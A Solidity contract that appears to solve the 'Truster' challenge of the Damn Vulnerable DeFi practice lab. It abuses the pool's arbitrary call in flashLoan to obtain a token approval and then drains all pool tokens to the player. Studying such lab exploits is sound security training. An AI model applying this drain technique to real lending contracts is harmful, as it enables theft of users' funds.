// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    error RepayFailed();

    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
        token = _token;
        pool = _pool;
    }

    function attackPool(address player) external {
        uint attackAmount = token.balanceOf(address(pool));
        pool.flashLoan(
            0, 
            address(this), 
            address(token), 
            abi.encodeWithSelector(
                token.approve.selector, 
                address(this), 
                attackAmount
            )
        );

        token.transferFrom(address(pool), player, attackAmount);
    }
}
